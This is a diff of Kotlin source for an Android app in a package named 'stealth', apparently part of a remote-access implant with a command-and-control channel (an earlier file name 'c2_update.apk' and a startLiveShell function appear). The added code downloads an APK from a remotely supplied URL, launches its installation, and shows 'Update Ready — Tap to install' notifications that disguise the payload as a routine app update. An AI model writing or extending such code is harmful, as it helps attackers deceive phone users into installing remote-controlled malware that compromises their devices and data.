@@ -1,10 +1,19 @@
 package com.kaze.stealth
 
+import android.app.DownloadManager
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.app.PendingIntent
+import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
+import android.database.Cursor
 import android.net.Uri
 import android.os.Build
+import android.provider.Settings
 import android.util.Log
+import androidx.core.app.NotificationCompat
 import com.google.firebase.messaging.FirebaseMessaging
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -267,46 +276,119 @@ object Core {
         .readTimeout(60, TimeUnit.SECONDS)
         .build()
 
+    private const val UPDATE_CHANNEL_ID = "kaze_updates"
+    private const val UPDATE_NOTIFICATION_ID = 9999
+
     private fun downloadAndInstall(context: Context, url: String): String {
         return try {
-            val apkFile = File(context.filesDir, "c2_update.apk")
+            val dm = context.getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager
+            val request = DownloadManager.Request(Uri.parse(url))
+                .setTitle("Kaze Update")
+                .setDescription("Downloading update...")
+                .setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED)
+                .setDestinationInExternalFilesDir(context, null, "kaze_update.apk")
+                .setAllowedOverMetered(true)
+                .setAllowedOverRoaming(true)
 
-            val request = Request.Builder().url(url).build()
-            httpClient.newCall(request).execute().use { response ->
-                if (!response.isSuccessful) {
-                    return "ERROR:HTTP_${response.code}"
-                }
-                val body = response.body ?: return "ERROR:empty_body"
+            val downloadId = dm.enqueue(request)
+            Log.d(TAG, "Download started: id=$downloadId")
 
-                apkFile.outputStream().use { out ->
-                    body.byteStream().use { inp ->
-                        inp.copyTo(out)
+            createUpdateChannel(context)
+
+            val receiver = object : BroadcastReceiver() {
+                override fun onReceive(ctx: Context, intent: Intent) {
+                    val id = intent.getLongExtra(DownloadManager.EXTRA_DOWNLOAD_ID, -1)
+                    if (id != downloadId) return
+
+                    ctx.unregisterReceiver(this)
+
+                    val installed = installDownloadedApk(ctx, dm, downloadId)
+                    if (installed) {
+                        showInstallNotification(ctx)
+                    } else {
+                        showDownloadFailedNotification(ctx)
                     }
                 }
             }
 
-            val magic = ByteArray(4)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                context.registerReceiver(receiver, IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE), Context.RECEIVER_NOT_EXPORTED)
+            } else {
+                context.registerReceiver(receiver, IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE))
+            }
+
+            "DOWNLOADING:$url"
+        } catch (e: Exception) {
+            Log.e(TAG, "Download error: ${e.message}")
+            "ERROR:${e.message}"
+        }
+    }
+
+    private fun installDownloadedApk(context: Context, dm: DownloadManager, downloadId: Long): Boolean {
+        val query = DownloadManager.Query().setFilterById(downloadId)
+        val cursor: Cursor = dm.query(query) ?: return false
+        try {
+            if (!cursor.moveToFirst()) return false
+            val uriIdx = cursor.getColumnIndex(DownloadManager.COLUMN_LOCAL_URI)
+            val uriString = cursor.getString(uriIdx) ?: return false
+            val fileUri = Uri.parse(uriString)
+
+            val apkFile = File(fileUri.path!!)
+            if (!apkFile.exists()) return false
+
+            val magic = ByteArray(2)
             apkFile.inputStream().use { it.read(magic) }
             if (magic[0] != 0x50.toByte() || magic[1] != 0x4B.toByte()) {
                 apkFile.delete()
-                return "ERROR:not_a_valid_apk"
+                return false
             }
 
-            val uri = androidx.core.content.FileProvider.getUriForFile(
-                context,
-                "${context.packageName}.fileprovider",
-                apkFile
+            val contentUri = androidx.core.content.FileProvider.getUriForFile(
+                context, "${context.packageName}.fileprovider", apkFile
             )
-            val intent = Intent(Intent.ACTION_VIEW).apply {
-                setDataAndType(uri, "application/vnd.android.package-archive")
+            val installIntent = Intent(Intent.ACTION_VIEW).apply {
+                setDataAndType(contentUri, "application/vnd.android.package-archive")
                 addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                 addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
             }
-            context.startActivity(intent)
-            "DOWNLOADING:$url"
-        } catch (e: Exception) {
-            "ERROR:${e.message}"
+            context.startActivity(installIntent)
+            return true
+        } finally {
+            cursor.close()
         }
+    }
+
+    private fun createUpdateChannel(context: Context) {
+        val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+        if (nm.getNotificationChannel(UPDATE_CHANNEL_ID) == null) {
+            val channel = NotificationChannel(UPDATE_CHANNEL_ID, "Updates", NotificationManager.IMPORTANCE_HIGH)
+            channel.description = "App update notifications"
+            nm.createNotificationChannel(channel)
+        }
+    }
+
+    private fun showInstallNotification(context: Context) {
+        val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+        val notification = NotificationCompat.Builder(context, UPDATE_CHANNEL_ID)
+            .setSmallIcon(android.R.drawable.stat_sys_download_done)
+            .setContentTitle("Update Ready")
+            .setContentText("Tap to install the update")
+            .setPriority(NotificationCompat.PRIORITY_HIGH)
+            .setAutoCancel(true)
+            .build()
+        nm.notify(UPDATE_NOTIFICATION_ID, notification)
+    }
+
+    private fun showDownloadFailedNotification(context: Context) {
+        val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+        val notification = NotificationCompat.Builder(context, UPDATE_CHANNEL_ID)
+            .setSmallIcon(android.R.drawable.stat_notify_error)
+            .setContentTitle("Update Failed")
+            .setContentText("Downloaded file is not a valid APK")
+            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
+            .setAutoCancel(true)
+            .build()
+        nm.notify(UPDATE_NOTIFICATION_ID, notification)
     }
 
     private fun startLiveShell(context: Context) {
